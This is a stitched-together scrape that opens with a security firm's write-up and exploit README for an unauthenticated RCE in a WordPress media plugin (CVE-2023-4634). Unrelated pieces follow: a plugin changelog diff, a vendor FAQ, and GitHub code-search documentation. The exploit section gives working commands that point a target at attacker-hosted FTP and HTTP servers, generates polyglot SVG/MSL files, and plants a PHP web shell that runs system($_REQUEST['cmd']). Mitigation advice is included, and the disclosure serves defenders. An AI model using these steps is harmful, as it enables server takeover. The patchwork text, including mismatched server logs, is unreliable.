      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-";
```

<https://github.com/ImageMagick/ImageMagick/blob/main/MagickCore/resource.c>

Then, we can only bruteforce the 65 chars as first characters, using 65 different SVG files, each of them containing a first letter to bruteforce: exploiter\_A.svg containing `text:vid:msl:/tmp/magick-A*`, exploiter\_B.svg containitng
`text:vid:msl:/tmp/magick-B*` ...

With that, we will, with a high level of confidence, find the so wanted SVG/MSL uploaded file without reaching a blank temporary file or another MVG file.

To increase our chances, lets launch the generation of hundred “long SVG” so that we will be sure one of the bruteforce will work (only one is needed) without any nasty 0byte file before that.

Even if the target has already many non-deleted /tmp/magick file, we will for sure, at one moment, find one that will work using that technic.

## Bomb this City and Everyone in It

Now we have all in our hand, we can set up the exploit and the bruteforcer.

All is explained and scripted here:
<https://github.com/Patrowl/CVE-2023-4634/>
The final path of the exploit is then:

* Launch x100 long SVG/MSL polyglot file conversion that will trigger creation of x100 SVG/MSL file in /tmp folder
* Use SVG with VID formatter using wildcard to bruteforce on of the 100 hundred SVG/MSL filename in /tmp folder with only 65 requests.
* Baboum

We also create a Nuclei template to detect the exploitability (not just the plugin version):
<https://github.com/Patrowl/CVE-2023-4634/blob/master/CVE-2023-4634.yaml>

## SVGs Means Trouble

This exploitation was for us quite interesting to perform, as it highlights the dangerousness of external libraries that could be used in WordPress Plugins. Not sure WordPress administrator has a clean view of the configuration of each external library used, especially of Imagick that came directly installed with a “basic” instance of Wordpress.

As explained in the article, the position of Imagemagick teams is clear and they are quite reactive on security subject. We warned them about the dangerousness of SVG Parsing, and default allowing of SVG, but their response was what we expected:

\*While it's possible to defend against certain vulnerabilities, such as the use of SVG's xlink, through a definition mechanism, it's not a robust security approach. For instance, xlink would remain inactive by default unless a specific definition is specified. Yet, this strategy proves inadequate as it's akin to a temporary solution, and we would be continuously reacting to emerging vulnerabilities until the next one emerges. The security policy was designed specifically to address potentially unknown exploits. If a new exploit is discovered, the user is protected by invoking the appropriate security policy. The result is immediate protection against the exploit without the need to update the binary distribution.

Security is a compromise between security and convenience. The open nature of ImageMagick allows any user to exploit all the features of the package in a secure environment such as Docker, yet the security policy allows an administrator to selectively lock out features per their local context in a more open environment such as a public web site. For any public web site, we recommend these coders: MSL, MSVG, MVG, PS, PDF, RSVG, SVG, XPS, be disabled in the security policy.

**To be clear**, if you are a WordPress administrator, you must reinforce your default security Imagick policies located in `/etc/ImageMagick-X/policy.xml`, to disallow MSL, MSVG, MVG, PS, PDF, RSVG, SVG, XPS (especially SVG not disable by default which is for us one of the dangerous one). Even if you think that your WordPress does not use this library.

Regarding the plugin itself, special thanks to David Lingren which has been quite reactive for the fix (3.10 version).

Finally, all Patrowl customers using this plugin were warned. The plugins have been disabled during the time of patching, and then re-enabled the plugin when 3.10 has been released with the correction. Some of them even restrict Imagick libraries to be sure.

# CVE-2023-4634

RCE Exploit for Wordpress Plugin Media-Library Plugin < 3.10 (CVE-2023-4634)

# Info

Patrowl discovered An unauthenticated RCE Vulnerability on Media-Librairy-Assistant Wordpress Plugin in version < 3.10.
The exploit is not trivial and requires just a little setup explained bellow.

Global discover and exploitaiton of the exploit could be found in our blog: <https://patrowl.io/blog-wordpress-media-library-rce-cve-2023-4634/>

# Prerequisite of exploitaiton

* Wordpress installed (all versions will work)
* Media-Library-Assistant in version < 3.10 (<https://fr.wordpress.org/plugins/media-library-assistant/>)
* Imagick libraries installed on the server
* Default Imagick configuration
* external network connectivitiy

# Detection

The detection of the vulnerability could be performed using a basic DNS check on a remote FTP server. The nuclei template could be found on : CVE-2023-4634.yaml.

```
nuclei -u http://x.x.x.x -t ./CVE-2023-4634.yaml

```

The complete exploitation and RCE could then be performed using the CVE-2023-4634.py script.

Note: You can also use the script to trigger more simple exploitation such as LFI, just need to forge specific SVG and host it on your FTP, follow recommendations in our blog.

# Usage

Install requirement:

```
python3 -m pip install -r requirements.txt

```

Then

```
python3 CVE-CVE-2023-4634.py -h

```

Gives you:

```
usage: CVE-2023-4634 Exploit [-h] [--target [TARGET]] [--remoteftp [REMOTEFTP]] [--remotehttp [REMOTEHTTP]] [--svg_polyglot_name [SVG_POLYGLOT_NAME]] [--svg_exploiter_names [SVG_EXPLOITER_NAMES]] [--png_polyglot_name [PNG_POLYGLOT_NAME]] [--concurrency [CONCURRENCY]] [--generatesvg | --no-generatesvg] [--webserverpath WEBSERVERPATH]

                        Number of concurrent long SVG conversion requests to make ( default 100 )
  --generatesvg, --no-generatesvg
                        Generate both polyglot SVG/MSL file and VID bruteforcer within the remote_ftp directory
  --webserverpath WEBSERVERPATH
                        Path of the webserver on the victim server (could be found with the LFI and wp-config file) example: /var/www/html
  --exploitname EXPLOITNAME
                        Dropped exploit name example: pwned.php
  --generatepng, --no-generatepng
                        Generate polyglot PNG/PHP file, integrate php file with -payload option in exploit-png folder
  --payload PAYLOAD     PHP Payload to integrate in the PNG file ex: <?php phpinfo(); ?>
```

Now to be working you need to setup on remote hosts:

* 1 FTP server hosting polyglot SVG/MSL and SVG/VID exploiters
* 1 HTTP server hosting the polyglot PNG/MSL

# Before exploitation

## Prepare your FTP Server

You can run a simple FTP server using Python :

```
python3 -m pyftpdlib -p 2122
[I 2023-08-31 12:24:17] concurrency model: async
[I 2023-08-31 12:24:17] masquerade (NAT) address: None
[I 2023-08-31 12:24:17] passive ports: None
[I 2023-08-31 12:24:17] >>> starting FTP server on 0.0.0.0:2122, pid=482661 <<<
```

Once setup, you need to add to your FTP servers the SVG/MSL polyglot files, and all SVG exploiters, you can easily generate them using the script:

```
python3 CVE-2023-4634.py --generatesvg --svg_polyglot_name poly.svg --svg_exploiter_names exploiter_FUZZ.svg  --remotehttp http://192.168.1.164:8081 --png_polyglot_name virus.png  --webserverpath /var/www/html --exploitname pwned.php
```

It will generate in `remote_ftp` folder:

* poly.svg, polyglot SVG/MSL with non routed address that will take long time to be generated by the target, with a MSL that will store the `png_polyglot_name` from `remotettp` to the destination path (`webserverpath`+ `exploitname`)
* all 64 SVG/VID exploiters using the exploiter\_FUZZ nomenclature where FUZZ will be replaced by bruteforced char

Note that the script will also copy the svg file with [0] at the end of it (poly.svg and poly.svg[0]).
Both files are needed for the exploitation to be working.

Put all the generated file (normal and [0]) in your FTP root directory of your FTP server.
It should looks like this:

```
ls remote_ftp/
exploiter_-.svg    exploiter_3.svg    exploiter_7.svg    exploiter_B.svg    exploiter_F.svg    exploiter_J.svg    exploiter_N.svg    exploiter_R.svg    exploiter_V.svg    exploiter_Z.svg
exploiter_-.svg[0] exploiter_3.svg[0] exploiter_7.svg[0] exploiter_B.svg[0] exploiter_F.svg[0] exploiter_J.svg[0] exploiter_N.svg[0] exploiter_R.svg[0] exploiter_V.svg[0] exploiter_Z.svg[0]
exploiter_0.svg    exploiter_4.svg    exploiter_8.svg    exploiter_C.svg    exploiter_G.svg    exploiter_K.svg    exploiter_O.svg    exploiter_S.svg    exploiter_W.svg    exploiter__.svg
exploiter_0.svg[0] exploiter_4.svg[0] exploiter_8.svg[0] exploiter_C.svg[0] exploiter_G.svg[0] exploiter_K.svg[0] exploiter_O.svg[0] exploiter_S.svg[0] exploiter_W.svg[0] exploiter__.svg[0]
exploiter_1.svg    exploiter_5.svg    exploiter_9.svg    exploiter_D.svg    exploiter_H.svg    exploiter_L.svg    exploiter_P.svg    exploiter_T.svg    exploiter_X.svg    poly.svg
exploiter_1.svg[0] exploiter_5.svg[0] exploiter_9.svg[0] exploiter_D.svg[0] exploiter_H.svg[0] exploiter_L.svg[0] exploiter_P.svg[0] exploiter_T.svg[0] exploiter_X.svg[0] poly.svg[0]
exploiter_2.svg    exploiter_6.svg    exploiter_A.svg    exploiter_E.svg    exploiter_I.svg    exploiter_M.svg    exploiter_Q.svg    exploiter_U.svg    exploiter_Y.svg
exploiter_2.svg[0] exploiter_6.svg[0] exploiter_A.svg[0] exploiter_E.svg[0] exploiter_I.svg[0] exploiter_M.svg[0] exploiter_Q.svg[0] exploiter_U.svg[0] exploiter_Y.svg[0]
```

## Prepare your HTTP Server

You can run a simple HTTP server using Python:

```
python3 -m http.server -p 8081
[I 2023-08-31 12:24:17] concurrency model: async
[I 2023-08-31 12:24:17] masquerade (NAT) address: None
[I 2023-08-31 12:24:17] passive ports: None
[I 2023-08-31 12:24:17] >>> starting FTP server on 0.0.0.0:2122, pid=482661 <<<
```

You just need to add your polyglot PNG/PHP file. You can also use the script to genrate the file and include the wanted payload:

```
python3 CVE-2023-4634.py --generatepng --payload "<?php if(isset(\$_REQUEST['cmd'])){ echo \"<pre>\"; \$cmd = (\$_REQUEST['cmd']); system(\$cmd); echo \"</pre>\"; die; }?>" --png_polyglot_name virus.png
```

# Exploit

Now that both remote FTP server and HTTP server are ready, you can lauch exploitation on vulnerable target (the script will check if the target is using a vulnerable version of the plugins).
Example:

```
python3 CVE-2023-4634.py --target http://127.0.0.1 --remoteftp ftp://192.168.1.164:2122 --remotehttp http://192.168.1.164:8081 --svg_polyglot_name poly.svg --svg_exploiter_names exploiter_FUZZ.svg --png_polyglot_name virus.png  --exploitname pwned.php
```

And if everything is ok, you should have your `exploitname` dropped within the `webserverpath` (depend on how you configure your exploit)
Enjoy!

# Mitigations

* Upgrade to the latest version of the plugins (<https://fr.wordpress.org/plugins/media-library-assistant/>)
* Reinforce Imagick security policy by disable dangerous file to be converted such as : "MSL, MSVG, MVG, PS, PDF, RSVG, SVG, XPS, VID"
  Could be done by adding

```
  <policy domain="coder" rights="none" pattern="SVG" />
  <policy domain="coder" rights="none" pattern="MSL" />
  <policy domain="coder" rights="none" pattern="MSVG" />
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="VID" />

```

To

```
/etc/ImageMagick-X/policy.xml

```

  | 4503 |  | ~~<li>Scroll down to the bottom of the "Markup Templates" section where you can see a blank "Name:" text box. Give your template a name, such as "table-markup".</li>~~ |
  | 4504 |  | ~~<li>Copy the template parts from the above example and paste them into the corresponding part text boxes.</li>~~ |
  | 4505 |  | ~~<li>Review the content to make sure all the HTML and CSS markup is valid and not corrupted by the copy process.</li>~~ |

  | 5960 | 5953 | <h4>Sorting and Filtering on Where-used Status</h4> |
  | 5961 | 5954 | <p>As noted above the four Media/Assistant where-used columns are not sortable, and they cannot be used to filter the table display. There is no explicit way to filter the Media/Assistant submenu table to display only where-used issues such as "orphans". There is, however, an approximate solution that may be useful. To get the best results you need to activate all four reporting categories in the Where-used Reporting section of the Settings/Media Library Assistant General tab. Try these settings:</p> |
  | 5962 |  | <ul~~><ul~~ class="mla\_settings"> |
  |  | 5955 | <ul class="mla\_settings"> |
  | 5963 | 5956 | <li>Featured in - Enabled</li> |
  | 5964 | 5957 | <li>Inserted in - Base</li> |

FREQUENTLY ASKED QUESTIONS

### What is the difference between Patrowl and a vulnerability scanner?

*Vulnerability scanners are mainly* ***limited*** *to checking the deployment of patches for* ***known vulnerabilities****, referenced CVE:*

* **Patrowl** ensures 100% security like a penetration testing but continuously: CVE, configuration error, OWASP, data leaks...

*Vulnerability scanners are tools that* ***require*** *a lot of expertise and time to manage, configure and schedule scans:*

* **Patrowl** does all of this continuously, automatically.

*Vulnerability scanners operate within a* ***limited perimeter****, which must be declared:*

* **Patrowl** continuously **discover** everything you expose on the Internet.

*Vulnerability scanners generate unqualified reports, full of* ***false positives****, hundreds of pages long, unusable, requiring sharp expertise to analyze them:*

* **Patrowl** alerts you only on qualified vulnerabilities that present a real risk to your information system and provides solutions to remedy them.

*Vulnerability scanners offer* ***generic remediations****:*

* **Patrowl** offers **complete** and detailed remediation, suitable for non-experts, with configuration or command examples to allow you to correct as quickly as possible.

### How do you ensure zero false positives?

All vulnerabilities reported by Patrowl are automatically pre-qualified by several criteria including:

* The technical severity of the vulnerability: CVSSv3
* The criticality of the asset
* The exposure level of the asset
* The origin of the vulnerability

The vulnerabilities are then validated by an offensive operator.

### How is discovery done?

You declare technical information (IP addresses and domain names) and/or general information (company name, subsidiary, brand, product name, etc.) and then Patrowl automatically takes care of the rediscovery. Patrowl pivots on different repositories or techniques such as Whois, subdomains, Certificate Transparency, Subject Alternative Name, Wikipedia, RIPE, etc.

# Understanding GitHub Code Search syntax

You can build search queries for the results you want with specialized code qualifiers, regular expressions, and boolean operations.

## [About code search query structure](#about-code-search-query-structure)

The search syntax in this article only applies to searching code with GitHub code search. Note that the syntax and qualifiers for searching for non-code content, such as issues, users, and discussions, is not the same as the syntax for code search. For more information on non-code search, see [About searching on GitHub](/en/search-github/getting-started-with-searching-on-github/about-searching-on-github) and [Searching on GitHub](/en/search-github/searching-on-github).

Search queries consist of search terms, comprising text you want to search for, and qualifiers, which narrow down the search.

A bare term with no qualifiers will match either the content of a file or the file's path.

For example, the following query:

```
http-push

```

The above query will match the file `docs/http-push.txt`, even if it doesn't contain the term `http-push`. It will also match a file called `example.txt` if it contains the term `http-push`.

You can enter multiple terms separated by whitespace to search for documents that satisfy both terms.

For example, the following query:

```
sparse index

```

The search results would include all documents containing both the terms `sparse` and `index`, in any order. As examples, it would match a file containing `SparseIndexVector`, a file with the phrase `index for sparse trees`, and even a file named `index.txt` that contains the term `sparse`.

Searching for multiple terms separated by whitespace is the equivalent to the search `hello AND world`. Other boolean operations, such as `hello OR world`, are also supported. For more information about boolean operations, see [Using boolean operations](#using-boolean-operations).

Code search also supports searching for an exact string, including whitespace. For more information, see [Query for an exact match](#query-for-an-exact-match).

You can narrow your code search with specialized qualifiers, such as `repo:`, `language:` and `path:`. For more information on the qualifiers you can use in code search, see [Using qualifiers](#using-qualifiers).

You can also use regular expressions in your searches by surrounding the expression in slashes. For more information on using regular expressions, see [Using regular expressions](#using-regular-expressions).

## [Query for an exact match](#query-for-an-exact-match)

To search for an exact string, including whitespace, you can surround the string in quotes. For example:

```
"sparse index"

```

You can also use quoted strings in qualifiers, for example:

```
path:git language:"protocol buffers"

```
## [Searching for quotes and backslashes](#searching-for-quotes-and-backslashes)

To search for code containing a quotation mark, you can escape the quotation mark using a backslash. For example, to find the exact string `name = "tensorflow"`, you can search:

```
"name = \"tensorflow\""

```

To search for code containing a backslash, `\`, use a double backslash, `\\`.

The two escape sequences `\\` and `\"` can be used outside of quotes as well. No other escape sequences are recognized, though. A backslash that isn't followed by either `"` or `\` is included in the search, unchanged.

Additional escape sequences, such as `\n` to match a newline character, are supported in regular expressions. See [Using regular expressions](#using-regular-expressions).

## [Using boolean operations](#using-boolean-operations)

Code search supports boolean expressions. You can use the operators `AND`, `OR`, and `NOT` to combine search terms.

By default, adjacent terms separated by whitespace are equivalent to using the `AND` operator. For example, the search query `sparse index` is the same as `sparse AND index`, meaning that the search results will include all documents containing both the terms `sparse` and `index`, in any order.

To search for documents containing either one term or the other, you can use the `OR` operator. For example, the following query will match documents containing either `sparse` or `index`:

```
sparse OR index

```

To exclude files from your search results, you can use the `NOT` operator. For example, to exclude files in the `__testing__` directory, you can search:

```
"fatal error" NOT path:__testing__

```

You can use parentheses to express more complicated boolean expressions. For example:

```
(language:ruby OR language:python) AND NOT path:"/tests/"

```
## [Using qualifiers](#using-qualifiers)

You can use specialized keywords to qualify your search.

* [Repository qualifier](#repository-qualifier)
* [Organization and user qualifiers](#organization-and-user-qualifiers)
* [Language qualifier](#language-qualifier)
* [Path qualifier](#path-qualifier)
* [Symbol qualifier](#symbol-qualifier)
* [Content qualifier](#content-qualifier)
* [Is qualifier](#is-qualifier)

### [Repository qualifier](#repository-qualifier)

To search within a repository, use the `repo:` qualifier. You must provide the full repository name, including the owner. For example:

```
repo:github-linguist/linguist

```

To search within a set of repositories, you can combine multiple `repo:` qualifiers with the boolean operator `OR`. For example:

```
repo:github-linguist/linguist OR repo:tree-sitter/tree-sitter

```

Note

Code search does not currently support regular expressions or partial matching for repository names, so you will have to type the entire repository name (including the user prefix) for the `repo:` qualifier to work.

### [Organization and user qualifiers](#organization-and-user-qualifiers)

To search for files within an organization, use the `org:` qualifier. For example:

```
org:github

```

To search for files within a personal account, use the `user:` qualifier. For example:

```
user:octocat

```

Note

Code search does not currently support regular expressions or partial matching for organization or user names, so you will have to type the entire organization or user name for the qualifier to work.

### [Language qualifier](#language-qualifier)

To narrow down to a specific languages, use the `language:` qualifier. For example:

```
language:ruby OR language:cpp OR language:csharp

```

For a complete list of supported language names, see [languages.yaml](https://github.com/github-linguist/linguist/blob/main/lib/linguist/languages.yml) in [github-linguist/linguist](https://github.com/github-linguist/linguist). If your preferred language is not on the list, you can open a pull request to add it.

### [Path qualifier](#path-qualifier)

To search within file paths, use the `path:` qualifier. This will match files containing the term anywhere in their file path. For example, to find files containing the term `unit_tests` in their path, use:

```
path:unit_tests

```

The above query will match both `src/unit_tests/my_test.py` and `src/docs/unit_tests.md` since they both contain `unit_test` somewhere in their path.

To match only a specific filename (and not part of the path), you could use a regular expression:

```
path:/(^|\/)README\.md$/

```

Note that the `.` in the filename is escaped, since `.` has special meaning for regular expressions. For more information about using regular expressions, see [Using regular expressions](#using-regular-expressions).

You can also use some limited glob expressions in the `path:` qualifier.

For example, to search for files with the extension `txt`, you can use:

```
path:*.txt

```

To search for JavaScript files within a `src` directory, you could use:
```
path:src/*.js

```

* By default, glob expressions are not anchored to the start of the path, so the above expression would still match a path like `app/src/main.js`. But if you prefix the expression with `/`, it will anchor to the start. For example:

  ```
  path:/src/*.js

  ```
* Note that `*` doesn't match the `/` character, so for the above example, all results will be direct descendants of the `src` directory. To match within subdirectories, so that results include deeply nested files such as `/src/app/testing/utils/example.js`, you can use `**`. For example:

  ```
  path:/src/**/*.js

  ```

You can also use the `?` global character. For example, to match the path `file.aac` or `file.abc`, you can use:

```
path:*.a?c

```

To search for a filename which contains a special character like `\*` or `?`, just use a quoted string:
```
path:"file?"

```

Glob expressions are disabled for quoted strings, so the above query will only match paths containing the literal string `file?`.

### [Symbol qualifier](#symbol-qualifier)

You can search for symbol definitions in code, such as function or class definitions, using the `symbol:` qualifier. Symbol search is based on parsing your code using the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, so no extra setup or build tool integration is required.

For example, to search for a symbol called `WithContext`:

```
language:go symbol:WithContext

```

In some languages, you can search for symbols using a prefix (e.g. a prefix of their class name). For example, for a method `deleteRows` on a struct `Maint`, you could search `symbol:Maint.deleteRows` if you are using Go, or `symbol:Maint::deleteRows` in Rust.

You can also use regular expressions with the symbol qualifier. For example, the following query would find conversions people have implemented in Rust for the `String` type:

```
language:rust symbol:/^String::to_.*/

```

Note that this qualifier only searches for definitions and not references, and not all symbol types or languages are fully supported yet. Symbol extraction is supported for the following languages:

* Bash
* C
* C#
* C++
* CodeQL
* Elixir
* Go
* JSX
* Java
* JavaScript
* Lua
* PHP
* Protocol Buffers
* Python
* R
* Ruby
* Rust
* Scala
* Starlark
* Swift
* Typescript

We are working on adding support for more languages. If you would like to help contribute to this effort, you can add support for your language in the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, upon which symbol search is based.

### [Content qualifier](#content-qualifier)

By default, bare terms search both paths and file content. To restrict a search to strictly match the content of a file and not file paths, use the `content:` qualifier. For example:

```
content:README.md

```

This query would only match files containing the term `README.md`, rather than matching files named `README.md`.

### [Is qualifier](#is-qualifier)

To filter based on repository properties, you can use the `is:` qualifier. `is:` supports the following values:

* `archived`: restricts the search to archived repositories.
* `fork`: restricts the search to forked repositories.
* `vendored`: restricts the search to content detected as vendored.
* `generated`: restricts the search to content detected as generated.

For example:

```
path:/^MIT.txt$/ is:archived

```

Note that the `is:` qualifier can be inverted with the `NOT` operator. To search for non-archived repositories, you can search:

```
log4j NOT is:archived

```

To exclude forks from your results, you can search:

```
log4j NOT is:fork

```
## [Using regular expressions](#using-regular-expressions)

Code search supports regular expressions to search for patterns in your code. You can use regular expressions in bare search terms as well as within many qualifiers, by surrounding the regex in slashes.

For example, to search for the regular expression `sparse.*index`, you would use:

```
/sparse.*index/

```

Note that you'll have to escape any forward slashes within the regular expression. For example, to search for files within the `App/src` directory, you would use:

```
/^App\/src\//

```

Inside a regular expression, `\n` stands for a newline character, `\t` stands for a tab, and `\x{hhhh}` can be used to escape any Unicode character. This means you can use regular expressions to search for exact strings that contain characters that you can't type into the search bar.

Most common regular expressions features work in code search. However, "look-around" assertions are not supported.

## [Separating search terms](#separating-search-terms)

All parts of a search, such as search terms, exact strings, regular expressions, qualifiers, parentheses, and the boolean keywords `AND`, `OR`, and `NOT`, must be separated from one another with spaces. The one exception is that items inside parentheses, `(` `)`, don't need to be separated from the parentheses.

If your search contains multiple components that aren't separated by spaces, or other text that does not follow the rules listed above, code search will try to guess what you mean. It often falls back on treating that component of your query as the exact text to search for. For example, the following query:

```
printf("hello world\n");

```

Code search will give up on interpreting the parentheses and quotes as special characters and will instead search for files containing that exact code.

If code search guesses wrong, you can always get the search you wanted by using quotes and spaces to make the meaning clear.

## [Case sensitivity](#case-sensitivity)

By default, code search is case-insensitive, and results will include both uppercase and lowercase results. You can do case-sensitive searches by using a regular expression with case insensitivity turned off. For example, to search for the string "True", you would use:

```
/(?-i)True/

```
